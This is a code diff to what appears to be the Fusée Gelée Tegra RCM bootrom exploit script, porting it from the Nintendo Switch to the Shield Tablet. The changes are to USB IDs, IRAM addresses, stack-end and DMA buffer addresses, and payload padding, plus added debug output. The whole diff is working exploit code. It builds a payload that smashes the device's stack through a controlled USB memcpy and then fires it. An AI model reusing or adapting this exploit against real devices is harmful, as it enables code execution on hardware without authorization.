@@ -31,9 +31,9 @@ import argparse
 import platform
 
 # specify the locations of important load components
-RCM_PAYLOAD_ADDR    = 0x40010000
-INTERMEZZO_LOCATION = 0x4001F000
-PAYLOAD_LOAD_BLOCK  = 0x40020000
+RCM_PAYLOAD_ADDR    = 0x4000e000
+INTERMEZZO_LOCATION = 0x40015000
+PAYLOAD_LOAD_BLOCK  = 0x40016000
 
 # notes:
 # GET_CONFIGURATION to the DEVICE triggers memcpy from 0x40003982
@@ -264,9 +264,9 @@ class LinuxBackend(HaxBackend):
 
 class RCMHax:
 
-    # Default to the Nintendo Switch RCM VID and PID.
+    # Default to the Shield Tablet RCM VID and PID.
     DEFAULT_VID = 0x0955
-    DEFAULT_PID = 0x7321
+    DEFAULT_PID = 0x7f40
 
     # USB constants used
     STANDARD_REQUEST_DEVICE_TO_HOST_TO_DEVICE   = 0x80
@@ -274,8 +274,8 @@ class RCMHax:
     GET_CONFIGURATION = 0x8
 
     # Exploit specifics
-    COPY_BUFFER_ADDRESSES   = [0x40005000, 0x40009000]   # The addresses of the DMA buffers we can trigger a copy _from_.
-    STACK_END               = 0x40010000                 # The address just after the end of the device's stack.
+    COPY_BUFFER_ADDRESSES   = [0x40003000, 0x40007000]   # The addresses of the DMA buffers we can trigger a copy _from_.
+    STACK_END               = 0x4000e000                 # The address just after the end of the device's stack.
 
     def __init__(self, wait_for_device=False, os_override=None, vid=None, pid=None):
         """ Set up our RCM hack connection."""
@@ -342,12 +342,19 @@ class RCMHax:
         packet_size = 0x1000
 
         while length:
+            print(hex(length) + " bytes remaining to send")
+
             data_to_transmit = min(length, packet_size)
             length -= data_to_transmit
 
             chunk = data[:data_to_transmit]
             data  = data[data_to_transmit:]
-            self.write_single_buffer(chunk)
+
+            try:
+                self.write_single_buffer(chunk)
+            except usb.USBError:
+                print(self.read(300))
+                raise
 
 
     def write_single_buffer(self, data):
@@ -420,27 +427,16 @@ if not os.path.isfile(intermezzo_path):
     print("Could not find the intermezzo interposer. Did you build it?")
     sys.exit(-1)
 
-# Get a connection to our device.
-try:
-    switch = RCMHax(wait_for_device=arguments.wait, vid=arguments.vid, pid=arguments.pid)
-except IOError as e:
-    print(e)
-    sys.exit(-1)
-
-# Print the device's ID. Note that reading the device's ID is necessary to get it into
-device_id = switch.read_device_id().tostring()
-print("Found a Tegra with Device ID: {}".format(device_id))
-
 # Prefix the image with an RCM command, so it winds up loaded into memory
-# at the right location (0x40010000).
+# at the right location (0x4000e000).
 
 # Use the maximum length accepted by RCM, so we can transmit as much payload as
 # we want; we'll take over before we get to the end.
-length  = 0x30298
+length  = 0x30284
 payload = length.to_bytes(4, byteorder='little')
 
-# pad out to 680 so the payload starts at the right address in IRAM
-payload += b'\0' * (680 - len(payload))
+# pad out to 644 so the payload starts at the right address in IRAM
+payload += b'\0' * (644 - len(payload))
 
 # Populate from [RCM_PAYLOAD_ADDR, INTERMEZZO_LOCATION) with the payload address.
 # We'll use this data to smash the stack when we execute the vulnerable memcpy.
@@ -450,7 +446,7 @@ intermezzo_location_raw = INTERMEZZO_LOCATION.to_bytes(4, byteorder='little')
 payload += (intermezzo_location_raw * repeat_count)
 
 # Include the Intermezzo binary in the command stream. This is our first-stage
-# payload, and it's responsible for relocating the final payload to 0x40010000.
+# payload, and it's responsible for relocating the final payload to 0x4000e000.
 intermezzo_size = 0
 with open(intermezzo_path, "rb") as f:
     intermezzo      = f.read()
@@ -474,6 +470,21 @@ payload_length = len(payload)
 padding_size   = 0x1000 - (payload_length % 0x1000)
 payload += (b'\0' * padding_size)
 
+print("Payload length: " + str(len(payload)))
+print("Max payload length: " + str(length - 0x1000))
+assert(length - 0x1000 >= len(payload))
+
+# Get a connection to our device.
+try:
+    switch = RCMHax(wait_for_device=arguments.wait, vid=arguments.vid, pid=arguments.pid)
+except IOError as e:
+    print(e)
+    sys.exit(-1)
+
+# Print the device's ID. Note that reading the device's ID is necessary to get it into
+device_id = switch.read_device_id().tostring()
+print("Found a Tegra with Device ID: {}".format(device_id))
+
 # Send the constructed payload, which contains the command, the stack smashing
 # values, the Intermezzo relocation stub, and the final payload.
 print("Uploading payload...")
@@ -486,7 +497,7 @@ switch.switch_to_highbuf()
 # Smash the device's stack, triggering the vulnerability.
 print("Smashing the stack...")
 try:
-    switch.trigger_controlled_memcpy()
+    print(switch.trigger_controlled_memcpy())
 except ValueError as e:
     print(str(e))
 except IOError:
